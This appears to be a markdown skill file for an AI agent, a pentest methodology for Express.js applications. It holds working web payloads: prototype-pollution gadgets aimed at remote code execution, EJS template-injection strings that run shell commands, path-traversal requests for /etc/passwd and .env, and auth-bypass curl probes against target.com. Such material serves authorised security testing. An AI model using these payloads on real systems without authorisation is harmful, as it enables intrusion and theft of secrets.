---
name: express
description: Security testing for Express.js applications covering middleware chain abuse, prototype pollution, template injection, and cookie security
---

# Express.js Security Testing

Express.js applications expose attack surface through middleware ordering, template engines, prototype pollution vectors, and Node.js-specific patterns. Focus on middleware bypass, EJS/Pug template injection, prototype pollution for RCE, and cookie/session misconfigurations.

## Attack Surface

**Middleware Chain**
- `app.use()` order matters — error handlers, auth checks, CORS
- `express.static()` serving unintended files
- Missing body parser limits — DoS via large payloads
- `app.param()` with user-controlled values
- Route-level middleware vs app-level middleware gaps

**Template Engines**
- EJS: `<%= %>` (escaped), `<%- %>` (unescaped), `<% %>` (code)
- Pug/Jade: `#{ var }` (escaped), `!{ var }` (unescaped)
- Handlebars: `{{ var }}` (escaped), `{{{ var }}}` (unescaped)
- Template injection via `res.render()` with user-controlled view name or locals

**Prototype Pollution**
- `Object.assign(target, user_input)` — pollutes prototype
- `_.merge(target, user_input)` (Lodash) — deep merge pollution
- `JSON.parse()` + merge patterns
- `__proto__`, `constructor.prototype` injection
- Polluted properties affect ALL objects → RCE via ejs/pug gadgets

**Cookies & Sessions**
- `express-session` configuration: `secure`, `httpOnly`, `sameSite`, `secret`
- `cookie-parser` secret strength
- Session fixation via `req.session.id`
- Cookie parsing inconsistencies (`;` vs `,` in cookie values)

**Error Handling**
- `app.use((err, req, res, next) =>)` — stack trace leakage
- `NODE_ENV !== 'production'` error pages
- `res.status(500).send(err.stack)` patterns

## Testing Methodology

### 1. Prototype Pollution → RCE

**Detection:**
```bash
# Test basic prototype pollution
curl -sk -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# Check if pollution persists
curl -sk https://target.com/api/any-endpoint
# Look for isAdmin:true in responses

# Constructor.prototype pollution
curl -sk -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'
```

**EJS gadget for RCE:**
```json
{
  "__proto__": {
    "settings": {
      "views": "/proc/self",
      "view engine": "fd/0"
    }
  }
}
```

**Server-side pollution to RCE:**
```json
{
  "__proto__": {
    "shell": "cat /etc/passwd",
    "env": {"NODE_OPTIONS": "--require=/proc/self/fd/0"}
  }
}
```

### 2. Template Injection (EJS)

**If user input reaches `res.render()` locals:**
```bash
# EJS SSTI payloads
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%- global.process.mainModule.require('child_process').execSync('id') %>
<%= this.constructor.constructor('return this.process.env')() %>
```

**If user input controls the view name:**
```bash
# Path traversal in view name
GET /render?view=../../../etc/passwd
GET /render?view=/proc/self/environ
```

### 3. Middleware Bypass

```bash
# Test if auth middleware can be bypassed
# Method override
curl -sk -X GET https://target.com/admin/users \
  -H "X-HTTP-Method-Override: POST"

# Path confusion
curl -sk https://target.com/admin/users/
curl -sk https://target.com/admin//users
curl -sk https://target.com/ADMIN/users
curl -sk https://target.com/admin/users%00

# Host header manipulation
curl -sk https://target.com/admin -H "Host: localhost"
```

### 4. Static File Serving Misconfig

```bash
# If express.static('public') is used:
curl -sk https://target.com/../etc/passwd
curl -sk https://target.com/../package.json
curl -sk https://target.com/../.env
curl -sk https://target.com/../server.js

# Check for source map exposure
curl -sk https://target.com/bundle.js.map
```

### 5. Cookie & Session Audit

```bash
# Check cookie flags
curl -sk -D- https://target.com/ | grep -i set-cookie

# Look for:
# - Missing HttpOnly (XSS can steal session)
# - Missing Secure (sent over HTTP)
# - Weak SameSite (CSRF risk)
# - Predictable session IDs

# Session fixation test
# 1. Get session cookie before login
# 2. Login with credentials
# 3. Check if session ID changed
```

### 6. Error Information Disclosure

```bash
# Trigger 500 errors
curl -sk https://target.com/api/endpoint -H "Content-Type: application/json" -d '{invalid'
curl -sk https://target.com/api/endpoint -H "Content-Type: application/json" -d '{"__proto__":null}'

# Check for stack traces, file paths, Node.js version, dependency versions
```

### 7. Dependency & Config Exposure

```bash
# Check for exposed config
curl -sk https://target.com/package.json
curl -sk https://target.com/.env
curl -sk https://target.com/config.json
curl -sk https://target.com/.git/config

# Check for Express version in headers
curl -sk -D- https://target.com/ | grep -i x-powered-by
```

## Express-Specific CWEs

| Pattern | CWE | Risk |
|---------|-----|------|
| `Object.assign({}, user_input)` | CWE-1321 | Prototype pollution |
| `_.merge(obj, user_input)` | CWE-1321 | Prototype pollution |
| `<%- user_input %>` (EJS) | CWE-94 | SSTI/RCE |
| `!{ user_input }` (Pug) | CWE-94 | SSTI/RCE |
| `res.send(err.stack)` | CWE-200 | Info disclosure |
| `express.static('..')` | CWE-22 | Path traversal |
| Missing `httpOnly` cookie | CWE-1004 | Session theft |
| `x-powered-by: Express` | CWE-200 | Version disclosure |

## Validation Requirements

- Prototype pollution: confirm property persists across requests AND affects behavior
- Template injection: show actual command execution or data leak
- Middleware bypass: demonstrate access to protected resource
- Cookie issues: show actual exploitation (session hijack PoC)

## Tools

- `curl` for manual testing
- `ffuf` for path fuzzing
- `semgrep` with JavaScript/Node.js rules
- `npm audit` for dependency vulnerabilities
- `retire.js` for vulnerable JS library detection

## Pro Tips

- Express 4.x has `x-powered-by: Express` by default — disable with `app.disable('x-powered-by')`
- Check `app.set('trust proxy')` — if true, `X-Forwarded-For` spoofing works
- `express-session` default memory store leaks in production — check for Redis/MongoDB session stores
- Look for `bodyParser.json({ limit: 'infinity' })` — DoS via large payloads
- `res.sendFile()` with user input → path traversal
- Check for `helmet` middleware — if missing, many security headers are absent
